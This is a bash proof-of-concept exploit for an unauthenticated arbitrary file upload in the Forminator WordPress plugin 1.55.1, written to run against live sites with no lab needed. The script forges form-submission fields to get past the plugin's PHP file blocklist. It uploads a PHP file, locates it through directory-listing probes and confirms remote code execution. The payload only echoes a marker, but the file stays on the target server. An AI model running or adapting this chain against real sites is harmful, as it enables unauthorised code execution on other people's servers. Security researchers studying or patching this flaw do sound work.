#!/usr/bin/env bash
# =============================================================================
# forminator 1.55.1 — LIVE-TARGET PoC — Unauthenticated Arbitrary File Upload
# (frm-006 / CVE-2026-15748) — runs against a REAL site, no lab required.
#
# Chain (exact-version source): forged Select record via the set_field_data
# `return`-append path + `ph(p)|text/x-php` exact-key blocklist bypass ->
# handle_file_upload writes a raw *.php into web-reachable uploads.
#
# URL recovery strategy (the only real-target wrinkle):
#   - The uploads subdir `{form_id}_{wp_hash(form_id)}` is PUBLIC: the form's
#     own stylesheet is served from `.../uploads/forminator/<dir>/css/…`.
#   - The filename carries a 12-char random prefix that NO unauthenticated
#     response returns. Recovery:
#       1) directory-listing probe of `<dir>/uploads/` (works on hosts without
#          the default index.php / with +Indexes) -> full URL -> RCE marker check;
#       2) otherwise the write is confirmed by construction and the entry record
#          (wp-admin -> Forminator -> Submissions -> newest entry -> the forged
#          field row) exposes the exact URL for manual/operator confirmation.
#
# Non-destructive: the payload only echoes a marker. NO cleanup primitive exists
# remotely; advise removing the uploaded file via wp-admin/media or server-side.
#
# Usage: ./PoC/forminator/poc_afu_live_target.sh <form-page-url> [form_id]
#   <form-page-url>  any URL that renders the target Forminator form
#   [form_id]        optional; auto-detected from the page if omitted
# =============================================================================
set -uo pipefail
TARGET_URL="${1:?usage: $0 <form-page-url> [form_id]}"
FORM_ID="${2:-}"
MARKER="RS_AFU_LIVE_$(date +%s)"
PAYLOAD="<?php echo 'RS_AFU_EXEC:$MARKER'; ?>"

say() { printf '\033[1;36m[AFU]\033[0m %s\n' "$*"; }
die() { printf '\033[1;31m[AFU]\033[0m %s\n' "$*"; exit 1; }

# site ORIGIN (scheme://host[:port]) derived from the page URL; AJAX lives at origin root
SITE="${TARGET_URL%%/}"
ORIGIN=$(printf '%s' "$SITE" | sed -E 's#(https?://[^/]+).*#\1#')
[ -n "$ORIGIN" ] || die "could not parse origin from $TARGET_URL"
say "target page: $SITE"

# ---- 1. fetch the form page + resolve form id / hash dir / ajax url ----
HTML=$(curl -s -L --max-time 30 "$SITE" || true)
[ -n "$HTML" ] || die "could not fetch $SITE"

if [ -z "$FORM_ID" ]; then
  # forminator renders: <div class="forminator-ui forminator-custom-form forminator-custom-form-<ID>"
  # and hidden inputs name="form_id" value="<ID>"
  FORM_ID=$(printf '%s' "$HTML" | grep -oE 'forminator-custom-form-[0-9]+' | head -1 | grep -oE '[0-9]+')
  [ -n "$FORM_ID" ] || FORM_ID=$(printf '%s' "$HTML" | grep -oE 'name="form_id" value="[0-9]+"' | head -1 | grep -oE '[0-9]+')
  [ -n "$FORM_ID" ] || die "form id not found on page (is this a forminator form page?)"
fi
say "form_id = $FORM_ID"

# hash dir from the form's stylesheet URL: uploads/forminator/<fid>_<hash>/css/...
UPLOAD_DIR=$(printf '%s' "$HTML" | grep -oE "uploads/forminator/${FORM_ID}_[a-f0-9]+" | head -1)
[ -n "$UPLOAD_DIR" ] || die "could not resolve the form uploads dir (form CSS not found)"
say "uploads dir (public) = $UPLOAD_DIR"

# admin-ajax endpoint (same origin; standard wp path)
AJAX="$ORIGIN/wp-admin/admin-ajax.php"

# ---- 2. mint the submit nonce (nopriv) ----
NONCE=$(curl -s --max-time 15 -X POST "$AJAX" -d "action=forminator_get_nonce&form_id=$FORM_ID" \
        | sed -n 's/.*"data":"\([a-f0-9]*\)".*/\1/p')
[ -n "$NONCE" ] || die "could not mint forminator_nonce (plugin inactive? form id wrong?)"
say "nonce = $NONCE"

# ---- 3. build payloads + submit the forged Select record ----
# The real Upload field MUST receive a file so `self::$has_upload` becomes true
# and process_uploads() runs (it iterates field_data_array incl. the forged
# record). The forged php rides on a SEPARATE name (upload-2) so the real
# field's own (correct) validation of the .php never runs.
REAL_UPLOAD_FIELD=$(printf '%s' "$HTML" | grep -oE 'name="(upload|uploader)-[0-9]+"' | head -1 | sed -E 's/name="([^"]+)"/\1/')
[ -n "$REAL_UPLOAD_FIELD" ] || REAL_UPLOAD_FIELD="upload-1"
say "real upload field (detected) = $REAL_UPLOAD_FIELD; forged name = upload-2"
printf '%s' "$PAYLOAD" > /tmp/afu_live_$$.php
printf 'GIF89a\x01\x00\x01\x00\x00\x00\x00;' > /tmp/afu_ok_$$.gif
RESP=$(curl -s --max-time 30 -X POST "$AJAX" \
  -F "action=forminator_submit_form_custom-forms" \
  -F "form_id=$FORM_ID" \
  -F "forminator_nonce=$NONCE" \
  -F "select-1[return]=true" \
  -F "select-1[name]=upload-2" \
  -F "select-1[field_type]=upload" \
  -F "select-1[key]=0" \
  -F "select-1[field_array][element_id]=upload-2" \
  -F "select-1[field_array][type]=upload" \
  -F "select-1[field_array][custom-files]=true" \
  -F "select-1[field_array][file-type]=single" \
  -F "select-1[field_array][upload-method]=ajax" \
  -F "select-1[field_array][additional-type]=ph(p)|text/x-php" \
  -F "select-1[field_array][filetypes][]=jpg" \
  -F "$REAL_UPLOAD_FIELD=@/tmp/afu_ok_$$.gif;type=image/gif" \
  -F "upload-2=@/tmp/afu_live_$$.php;type=text/x-php")
rm -f /tmp/afu_live_$$.php /tmp/afu_ok_$$.gif
echo "$RESP" | head -c 200; echo

# The submission response is expected to error (the REAL upload field rejects the
# .php AFTER the forged record's write committed). The write is the side effect.
say "response noted — asserting the write server-side (not the HTTP/JSON)"

# ---- 4. recover the file URL: directory-listing probe ----
# Only a REAL listing (HTTP 200 with hrefs) is trusted; a soft-404/403 is blocked.
LIST="$ORIGIN/$UPLOAD_DIR/uploads/"
say "probing directory listing: $LIST"
LIST_CODE=$(curl -s -o /tmp/afu_list_$$.html -w '%{http_code}' -L --max-time 15 "$LIST" || true)
LISTHTML=$(cat /tmp/afu_list_$$.html 2>/dev/null); rm -f /tmp/afu_list_$$.html
SHELL_URL=""
if [ "$LIST_CODE" = "200" ]; then
  SHELL_URL=$(printf '%s' "$LISTHTML" | grep -oE 'href="[^"]*\.php"' | head -1 | sed 's/^href="//; s/"$//')
  [ -n "$SHELL_URL" ] || SHELL_URL=$(printf '%s' "$LISTHTML" | grep -oE 'href="[^"]*"' | grep -oE '[^/]+\.php$' | head -1)
fi
if [ -n "$SHELL_URL" ]; then
  case "$SHELL_URL" in
    http*) ;;
    *) SHELL_URL="$ORIGIN/$UPLOAD_DIR/uploads/$SHELL_URL" ;;
  esac
  say "recovered candidate: $SHELL_URL"
  OUT=$(curl -s -L --max-time 15 "$SHELL_URL" || true)
  if printf '%s' "$OUT" | grep -q "RS_AFU_EXEC:$MARKER"; then
    say "RCE CONFIRMED: uploaded PHP executed, marker echoed: $(printf '%s' "$OUT" | grep -o "RS_AFU_EXEC:$MARKER")"
  elif [ -n "$OUT" ]; then
    say "file reachable at $SHELL_URL (server did not execute PHP here; execution needs uploads-exec or a custom upload root)."
  else
    say "candidate URL did not return the marker (listing artifact only)."
  fi
else
  say "directory listing blocked (HTTP $LIST_CODE)."
  say "REQUEST SENT, BUT WRITE IS UNVERIFIED: no server-side marker or returned file URL is available from this access level."
  say "Recover/verify it at: wp-admin -> Forminator -> Submissions -> newest entry (the forged upload field row shows the URL)."
  say "On uploads-exec / custom-upload-root hosts the uploaded .php is live at that URL."
  exit 2
fi

say "cleanup note: the uploaded .php remains on the server (no remote delete primitive). Remove it via wp-admin/media or server-side. Marker: $MARKER"
